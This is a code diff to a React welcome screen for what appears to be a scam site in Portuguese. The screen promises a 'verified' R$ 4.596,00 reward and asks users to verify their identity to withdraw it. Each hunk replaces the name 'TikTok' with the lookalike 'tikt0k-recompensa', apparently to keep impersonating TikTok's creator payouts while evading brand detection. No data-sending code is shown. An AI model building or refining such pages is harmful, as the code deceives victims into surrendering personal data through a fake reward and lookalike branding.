@@ -120,7 +120,7 @@ const WelcomeScreen = ({ userName, onContinue }: WelcomeScreenProps) => {
           </div>
           <p className="text-[44px] font-bold tracking-tighter leading-none text-center relative z-10">R$ 4.596,00</p>
           <p className="text-[11px] opacity-50 mt-3 text-center relative z-10">
-            Recompensa verificada do TikTok Creator Fund
+            Recompensa verificada do tikt0k-recompensa
           </p>
         </div>
 
@@ -130,7 +130,7 @@ const WelcomeScreen = ({ userName, onContinue }: WelcomeScreenProps) => {
         </div>
 
         <p className="text-sm text-muted-foreground text-center mb-6">
-          Para sacar seus fundos, precisamos verificar sua identidade. Este é um processo único exigido pela política de pagamentos do TikTok.
+          Para sacar seus fundos, precisamos verificar sua identidade. Este é um processo único exigido pela política de pagamentos do tikt0k-recompensa.
         </p>
 
         {/* Benefits list */}
@@ -163,7 +163,7 @@ const WelcomeScreen = ({ userName, onContinue }: WelcomeScreenProps) => {
             Continuar para Verificação
           </Button>
           <p className="text-[10px] text-muted-foreground/60 text-center mt-3">
-            Ao continuar, você concorda com os termos de verificação do TikTok
+            Ao continuar, você concorda com os termos de verificação do tikt0k-recompensa
           </p>
         </div>
       </div>
